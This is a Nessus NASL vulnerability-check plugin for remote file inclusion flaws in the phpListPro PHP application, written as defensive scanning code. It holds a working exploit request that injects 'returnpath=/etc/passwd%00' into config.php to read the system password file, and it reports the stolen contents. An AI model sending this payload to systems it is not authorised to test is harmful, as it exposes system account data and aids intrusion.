#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

include("compat.inc");

if (description) {
  script_id(21310);
  script_version("$Revision: 1.9 $");
  script_bugtraq_id(17448);
  script_cve_id("CVE-2006-1749", "CVE-2006-2323");
  script_xref(name:"OSVDB", value:"24540"); 
  script_xref(name:"OSVDB", value:"25904"); 
  script_xref(name:"OSVDB", value:"25906"); 
  script_xref(name:"OSVDB", value:"25905"); 

  script_name(english:"phpListPro Multiple Script returnpath Parameter Remote File Inclusions");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
remote file include vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpListPro, a web site voting/ranking tool
written in PHP. 

The installed version of phpListPro fails to sanitize user input to
the 'returnpath' parameter of the 'config.php', 'editsite.php',
'addsite.php', and 'in.php' scripts before using it to include PHP
code from other files.  An unauthenticated attacker may be able to
read arbitrary local files or include a file from a remote host that
contains commands which will be executed on the remote host subject to
the privileges of the web server process. 

These flaws are only exploitable if PHP's 'register_globals' is
enabled." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-04/0206.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0153.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0199.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.smartisoft.com/forum/viewtopic.php?t=3019" );
 script_set_attribute(attribute:"solution", value:
"Edit the affected files as discussed in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 
  script_summary(english:"Checks for file includes in phpListPro's config.php");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
#
# Google for '"PHPListPro Ver"|intitle:"rated TopList"'.
if (thorough_tests) dirs = list_uniq(make_list("/phplistpro", "/toplist", "/topsite", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw in config.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/config.php?",
      "returnpath=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "Failed opening".
      egrep(string:res, pattern:"Failed opening required '/etc/passwd\\0lang_.+")
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) content = res;

    if (content)
    {
      report = string(
        "\n",
        "Here are the repeated contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
      security_hole(port:port, extra:report);
    }
    else
      security_hole(port:port);

    exit(0);
  }
}
